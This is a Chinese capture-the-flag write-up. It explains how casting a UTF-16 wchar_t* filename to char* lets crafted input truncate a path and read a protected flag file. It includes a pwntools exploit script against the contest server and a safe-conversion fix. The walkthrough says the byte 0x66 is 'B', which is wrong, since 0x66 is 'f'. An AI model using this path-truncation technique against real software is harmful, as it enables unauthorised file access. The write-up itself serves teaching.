# 不宽的宽字符

CPP + WinAPI，看见人都晕了。

## 程序分析

程序首先通过 Windows API 初始化控制台环境，获取标准输入输出句柄并设置控制台模式：

```cpp
// Get the console input and output handles
HANDLE hConsoleInput = GetStdHandle(STD_INPUT_HANDLE);
HANDLE hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);

if (hConsoleInput == INVALID_HANDLE_VALUE || hConsoleOutput == INVALID_HANDLE_VALUE)
{
    // Handle error – we can't get input/output handles.
    return 1;
}

DWORD mode;
GetConsoleMode(hConsoleInput, &mode);
SetConsoleMode(hConsoleInput, mode | ENABLE_PROCESSED_INPUT);
```

接着使用 `ReadFile` 函数从控制台读取用户输入，存入 256 字节的缓冲区 `inputBuffer`，并移除末尾的换行符：

```cpp
// Read the console input (wide characters)
if (!ReadFile(hConsoleInput, inputBuffer, sizeof(inputBuffer), &charsRead, nullptr))
{
    // Handle read error
    return 2;
}

// Remove the newline character at the end of the input
if (charsRead > 0 && inputBuffer[charsRead - 1] == L'\n')
{
    inputBuffer[charsRead - 1] = L'\0'; // Null-terminate the string
    charsRead--;
}
```

为了处理不同语言的字符，程序将用户输入的 UTF-8 编码内容转换为宽字符。这个转换过程会保留输入中的所有字节，包括 `NULL` 字节：

```cpp
// Convert to WIDE chars
wchar_t buf[256] = { 0 };
MultiByteToWideChar(CP_UTF8, 0, inputBuffer, -1, buf, sizeof(buf) / sizeof(wchar_t));
```

然后程序把转换后的内容存入 `wstring` 对象，并自信地在后面加上 `you_cant_get_the_flag`，试图阻止直接访问目标文件：

```cpp
std::wstring filename = buf;

// Haha!
filename += L"you_cant_get_the_flag";
```

然而在打开文件时存在一个类型转换错误，直接将 `wchar_t*` 强制转换为了 `char*`：

```cpp
std::wifstream file;
file.open((char*)filename.c_str());
```

最后，如果文件成功打开，程序会读取第一行内容作为 Flag 并输出：

```cpp
if (file.is_open() == false)
{
    std::wcout << L"Failed to open the file!" << std::endl;
    return 3;
}

std::wstring flag;
std::getline(file, flag);

std::wcout << L"The flag is: " << flag << L". Congratulations!" << std::endl;
```

## 漏洞分析

在 Windows 系统中，`wchar_t` 使用 UTF-16 编码，这意味着每个字符用 2 个字节表示。比如字符 `A` 在 UTF-16 中表示为 `0x0041`。

Windows 默认使用小端序（Little Endian），所以在这道题中字符 `A` 在内存中实际是 `41 00`。

程序的核心漏洞在于对字符串的类型转换，当程序执行：

```cpp
(char*)filename.c_str()
```

宽字符字符串 `wchar_t*` 被强制转换为普通字符串 `char*`，原本的 UTF-16 字节被直接解释为连续的字节序列。

举个例子，如果我们输入 `flag`：

程序会将其转换为 UTF-16 编码的字节串：

```
 echo -n "flag" | iconv -f ascii -t utf-16le | hexyl -g 2
┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
│00000000│ 6600 6c00 6100 6700 ┊                     │f⋄l⋄a⋄g⋄┊        │
└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
```

然后追加 `you_cant_get_the_flag`：

```
 echo -n "flagyou_cant_get_the_flag" | iconv -f ascii -t utf-16le | hexyl -g 2
┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
│00000000│ 6600 6c00 6100 6700 ┊ 7900 6f00 7500 5f00 │f⋄l⋄a⋄g⋄┊y⋄o⋄u⋄_⋄│
│00000010│ 6300 6100 6e00 7400 ┊ 5f00 6700 6500 7400 │c⋄a⋄n⋄t⋄┊_⋄g⋄e⋄t⋄│
│00000020│ 5f00 7400 6800 6500 ┊ 5f00 6600 6c00 6100 │_⋄t⋄h⋄e⋄┊_⋄f⋄l⋄a⋄│
│00000030│ 6700                ┊                     │g⋄      ┊        │
└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
```

当这个字符串被强制转换为 `char*` 时，程序会从这个内存地址开始，按照 C 风格字符串的规则读取字节序列：

```
66 00 6C 00 61 00 67 00 ...
   ^
遇到 00 时字符串结束
```

即文件名为 `B`（ASCII 编码为 66）。

所以如果我们精心构造一个字符串，让它在 UTF-16 编码下的字节序列满足：当被强制转换为 `char*` 时，这些字节正好表示 `Z:\\theflag`，并且紧跟一个 `NULL` 字节。

假设我们需要构造路径 `Z:\\theflag`，它的字节序列（包括 `NULL`）是：

```
 echo -ne "Z:\\\\theflag\x00" | hexyl
┌────────┬─────────────────────────┬─────────────────────────┬────────┬────────┐
│00000000│ 5a 3a 5c 74 68 65 66 6c ┊ 61 67 00                │Z:\thefl┊ag⋄     │
└────────┴─────────────────────────┴─────────────────────────┴────────┴────────┘
```

我们需要找到一个字符串，它的 UTF-16LE 编码恰好是这个序列，即每两个字节组成一个 UTF-16 字符：

```
 echo -ne "Z:\\\\theflag\x00" | hexyl -g 2
┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
│00000000│ 5a3a 5c74 6865 666c ┊ 6167 00             │Z:\thefl┊ag⋄     │
└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
```

这个过程在 Python 中很好实现：

```python
payload = b"Z:\\\\theflag\x00".decode("utf-16-le").encode()
```

## 利用脚本

```python
from pwn import *

context.log_level = "debug"

token = "<your_token>"

io = remote("202.38.93.141", 14202)
io.sendlineafter(b"token", token.encode())

payload = b"Z:\\\\theflag\x00".decode("utf-16-le").encode()
io.sendlineafter(b"to it:", payload)

io.interactive()
```

## 其他

如果想要正确处理 `wchar_t*` 字符串转换为 `char*` 的情景，正确且安全的方式是使用 `wcstombs_s` 函数。

例如：

```cpp
size_t convertedChars = 0;
size_t sizeInBytes = ((filename.length() + 1) * 2);
std::vector<char> converted(sizeInBytes);

errno_t err = wcstombs_s(
    &convertedChars,
    converted.data(),
    sizeInBytes,
    filename.c_str(),
    sizeInBytes
);
```

参考：

- [How to: Convert System::String to wchar_t\* or char\*](https://learn.microsoft.com/en-us/cpp/dotnet/how-to-convert-system-string-to-wchar-t-star-or-char-star?view=msvc-170)
- [wcstombs_s, \_wcstombs_s_l](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/wcstombs-s-wcstombs-s-l?view=msvc-170)
